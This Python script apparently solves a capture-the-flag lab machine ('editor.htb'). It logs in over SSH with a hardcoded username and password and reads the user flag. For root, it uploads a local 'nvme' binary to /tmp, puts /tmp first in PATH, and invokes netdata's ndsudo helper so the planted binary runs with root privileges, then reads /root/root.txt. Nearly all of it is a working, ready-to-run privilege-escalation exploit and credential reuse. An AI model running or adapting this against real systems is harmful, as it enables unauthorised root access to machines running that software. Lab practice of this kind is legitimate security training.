import argparse
import os
import sys
import time
from dataclasses import dataclass

import paramiko


@dataclass
class SSHCredentials:
    hostname: str
    username: str
    password: str


def send_file_scp(creds: SSHCredentials, local_file: str, remote_path: str) -> None:
    """Transfer a file to the remote host using SCP (SFTP)."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    print(f"[+] Connecting to {creds.hostname} as {creds.username}...")
    try:
        client.connect(
            hostname=creds.hostname,
            username=creds.username,
            password=creds.password,
            timeout=10,
        )
        print("[+] SSH connection established.")

        if not os.path.exists(local_file):
            raise FileNotFoundError(f"Local file {local_file} not found.")

        print(f"[+] Transferring {local_file} to {creds.username}@{creds.hostname}:{remote_path}...")
        sftp = client.open_sftp()
        sftp.put(local_file, remote_path)
        sftp.close()
        print(f"[+] File transferred successfully to {remote_path}.")
    finally:
        print("[+] Closing SSH connection.")
        client.close()


def fetch_user_flag(creds: SSHCredentials, flag_path: str = "user.txt") -> str:
    """Connect to the remote host over SSH and read the contents of the flag file."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    print(f"[+] Connecting to {creds.hostname} as {creds.username}...")
    try:
        client.connect(
            hostname=creds.hostname,
            username=creds.username,
            password=creds.password,
            timeout=10,
        )
        print("[+] SSH connection established.")

        command = f"cat {flag_path}"
        print(f"[+] Executing remote command: {command}")
        stdin, stdout, stderr = client.exec_command(command)

        print("[+] Reading command output...")
        flag = stdout.read().decode().strip()
        error_output = stderr.read().decode().strip()

        if error_output:
            raise RuntimeError(f"Failed to read {flag_path}: {error_output}")

        if not flag:
            raise RuntimeError(f"Flag file {flag_path} is empty or unreadable.")

        print(f"[+] Retrieved flag from {flag_path}.")
        return flag
    finally:
        print("[+] Closing SSH connection.")
        client.close()


def fetch_root_flag(creds: SSHCredentials, nvme_file: str = "nvme") -> str:
    """Transfer nvme file, execute commands, and retrieve root flag."""
    print("[+] Starting root flag retrieval process...")
    
    # Step 1: Transfer nvme file using SCP
    print("\n[+] ========== Step 1: Transferring nvme file ==========")
    send_file_scp(creds, nvme_file, "/tmp/nvme")
    
    # Step 2: Execute commands sequentially
    print("\n[+] ========== Step 2: Executing commands ==========")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    print(f"[+] Connecting to {creds.hostname} as {creds.username}...")
    try:
        client.connect(
            hostname=creds.hostname,
            username=creds.username,
            password=creds.password,
            timeout=10,
        )
        print("[+] SSH connection established.")

        # Execute commands sequentially
        # Note: Each exec_command creates a new shell, so we use absolute paths
        # but still execute the commands as requested
        
        print("[+] Step 1/5: cd /tmp")
        print("[+] Executing: cd /tmp")
        stdin, stdout, stderr = client.exec_command("cd /tmp")
        stdout.read()  # Consume output
        stderr.read()
        
        print("[+] Step 2/5: chmod +x nvme")
        print("[+] Executing: chmod +x /tmp/nvme")
        stdin, stdout, stderr = client.exec_command("chmod +x /tmp/nvme")
        output = stdout.read().decode().strip()
        error_output = stderr.read().decode().strip()
        if error_output:
            print(f"[!] Command output (stderr): {error_output}")
        if output:
            print(f"[+] Command output: {output}")
        
        print("[+] Step 3/5: export PATH=/tmp:$PATH")
        print("[+] Executing: export PATH=/tmp:$PATH")
        stdin, stdout, stderr = client.exec_command("export PATH=/tmp:$PATH")
        output = stdout.read().decode().strip()
        error_output = stderr.read().decode().strip()
        if error_output:
            print(f"[!] Command output (stderr): {error_output}")
        if output:
            print(f"[+] Command output: {output}")
        
        print("[+] Step 4/5: Execute nvme-list")
        # Use an interactive shell to handle cases where the exploit opens a new shell
        # This ensures step 5 runs in the same session if step 4 opens an interactive shell
        print("[+] Opening interactive shell for steps 4 and 5...")
        shell = client.invoke_shell()
        shell.settimeout(30)
        
        # Wait for shell to be ready
        time.sleep(1)
        
        # Execute step 4: export PATH and run nvme-list
        command4 = "export PATH=/tmp:$PATH && /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list\n cat /root/root.txt\n"
        print(f"[+] Executing: export PATH=/tmp:$PATH && /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list")
        print("[+] Note: This command may take a moment to complete...")
        shell.send(command4)
        
        # Read output from step 4 with timeout
        start_time = time.time()
        timeout_seconds = 30
        output_step4 = ""
        
        try:
            while True:
                if shell.recv_ready():
                    data = shell.recv(4096).decode(errors='ignore')
                    output_step4 += data
                    start_time = time.time()  # Reset timeout when receiving data
                    
                    # Check if command has completed (look for prompt or newline)
                    if "\n" in data or ":" in data or "$" in data or "#" in data:
                        # Wait a bit more to see if there's more output
                        time.sleep(0.5)
                        if not shell.recv_ready():
                            break
                
                # Check for timeout
                if time.time() - start_time > timeout_seconds:
                    print("[!] Command is taking longer than expected, continuing...")
                    break
                
                time.sleep(0.1)
        except Exception as e:
            print(f"[!] Error reading step 4 output: {e}")
        
        if output_step4.strip():
            print(f"[+] Step 4 output: {output_step4.strip()}")
        else:
            print("[+] Step 4 completed (no visible output)")
        
        # Small delay to ensure shell is ready
        time.sleep(0.5)
        
        # Step 5: Execute cat /root/root.txt in the same shell session
        print("[+] Step 5/5: cat /root/root.txt")
        print("[+] Executing: cat /root/root.txt")
        command5 = "cat /root/root.txt\n"
        shell.send(command5)
        
        # Read flag output
        start_time = time.time()
        timeout_seconds = 10
        flag_output = ""
        
        try:
            while True:
                if shell.recv_ready():
                    data = shell.recv(4096).decode(errors='ignore')
                    flag_output += data
                    start_time = time.time()
                    
                    # Check if we got the flag (typically ends with prompt or is complete)
                    if "\n" in data:
                        time.sleep(0.3)
                        if not shell.recv_ready():
                            break
                
                if time.time() - start_time > timeout_seconds:
                    break
                
                time.sleep(0.1)
        except Exception as e:
            print(f"[!] Error reading flag: {e}")
        
        # Extract flag (remove command echo, prompts, and extra whitespace)
        flag = flag_output.strip()
        
        # Remove command echo if present (look for "cat /root/root.txt" in the output)
        lines = flag.split('\n')
        flag_lines = []
        skip_next = False
        for i, line in enumerate(lines):
            # Skip lines that are command echoes or prompts
            if 'cat /root/root.txt' in line or line.strip() in ['$', '#', '']:
                continue
            # The flag is typically on its own line or after the command
            if line.strip() and not line.strip().startswith('[') and not ':' in line.split()[0] if line.split() else True:
                flag_lines.append(line.strip())
        
        # Join flag lines or use the whole output if no specific extraction worked
        if flag_lines:
            flag = '\n'.join(flag_lines)
        else:
            # Fallback: remove command echo patterns and prompts
            flag = flag.replace('cat /root/root.txt', '').strip()
            # Remove prompt characters from start/end
            flag = flag.lstrip('$#').strip()
            # Get first non-empty line that looks like a flag
            for line in flag.split('\n'):
                line = line.strip()
                if line and len(line) > 10:  # Flags are typically longer
                    flag = line
                    break
        
        flag = flag.strip()
        
        shell.close()
        
        if flag:
            print(f"[+] Command output: {flag}")
        
        if not flag:
            raise RuntimeError("Root flag file is empty or unreadable.")
        
        return flag
    finally:
        print("[+] Closing SSH connection.")
        client.close()


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="CSC.py",
        description="Retrieve flags from the target SSH server.",
    )
    parser.add_argument(
        "-t",
        "--target",
        help="Target hostname or IP address (required)",
    )
    parser.add_argument(
        "-u",
        "--username",
        default="oliver",
        help="SSH username (default: oliver)",
    )
    parser.add_argument(
        "-p",
        "--password",
        default="theEd1t0rTeam99",
        help="SSH password (default: theEd1t0rTeam99)",
    )
    parser.add_argument(
        "--flag-path",
        default="user.txt",
        help="Remote path to the flag file (default: user.txt)",
    )
    parser.add_argument(
        "--root",
        action="store_true",
        help="Retrieve root flag instead of user flag",
    )
    parser.add_argument(
        "--nvme-file",
        default="nvme",
        help="Local path to the nvme file (default: nvme)",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()

    print("[+] Preparing SSH credentials and target information...")
    if not args.target:
        print("[!] No target specified. Provide one with '-t <hostname_or_ip>'.")
        print("[!] Example: python CSC.py -t 1.1.1.2")
        print("[!] Example for root flag: python CSC.py -t editor.htb --root")
        return 1

    creds = SSHCredentials(
        hostname=args.target,
        username=args.username,
        password=args.password,
    )

    try:
        if args.root:
            flag = fetch_root_flag(creds, args.nvme_file)
            print("\n[+] ========== Operation completed successfully ==========")
            print(f"- ROOT_FLAG: {flag}")
        else:
            flag = fetch_user_flag(creds, args.flag_path)
            print("\n[+] ========== Operation completed successfully ==========")
            print(f"- USER_FLAG: {flag}")
    except Exception as exc:  # noqa: BLE001 - surface informative error to CLI
        print(f"[!] Error: {exc}", file=sys.stderr)
        return 1

    return 0


if __name__ == "__main__":
    raise SystemExit(main())

